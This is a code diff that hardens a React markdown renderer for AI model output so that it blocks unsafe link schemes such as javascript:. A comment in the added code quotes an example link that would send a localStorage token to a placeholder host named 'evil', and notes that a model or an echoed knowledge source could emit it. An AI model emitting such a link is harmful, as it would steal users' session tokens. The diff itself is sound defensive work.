@@ -5,14 +5,28 @@ import type { ReactNode } from "react";
 // ordered/unordered lists. Builds React nodes (no dangerouslySetInnerHTML), so
 // model output is escaped safely.
 
+// Only allow safe link schemes. A model (or echoed knowledge source) could emit
+// [click me](javascript:fetch('http://evil/?t='+localStorage.thunity_token)); React
+// does not block such hrefs at runtime, so a single click could exfiltrate the token.
+function safeHref(url: string): string | undefined {
+  const u = (url || "").trim();
+  if (/^(https?:|mailto:)/i.test(u)) return u;       // explicit safe schemes
+  if (/^(\/|\.\/|#)/.test(u)) return u;              // relative / anchor links
+  return undefined;                                   // block javascript:, data:, vbscript:, …
+}
+
 const INLINE: [RegExp, (m: RegExpMatchArray, k: string) => ReactNode][] = [
   [/^`([^`]+)`/, (m, k) => <code key={k} className="md-code">{m[1]}</code>],
   [/^\*\*([^*]+)\*\*/, (m, k) => <strong key={k}>{parseInline(m[1], k)}</strong>],
   [/^__([^_]+)__/, (m, k) => <strong key={k}>{parseInline(m[1], k)}</strong>],
   [/^\*([^*\n]+)\*/, (m, k) => <em key={k}>{parseInline(m[1], k)}</em>],
-  [/^\[([^\]]+)\]\(([^)\s]+)\)/, (m, k) => (
-    <a key={k} href={m[2]} target="_blank" rel="noreferrer noopener">{m[1]}</a>
-  )],
+  [/^\[([^\]]+)\]\(([^)\s]+)\)/, (m, k) => {
+    const href = safeHref(m[2]);
+    // If the URL scheme is unsafe, render the link text as plain (non-clickable) text.
+    return href
+      ? <a key={k} href={href} target="_blank" rel="noreferrer noopener">{m[1]}</a>
+      : <span key={k}>{m[1]}</span>;
+  }],
 ];
 
 function parseInline(text: string, prefix: string): ReactNode[] {
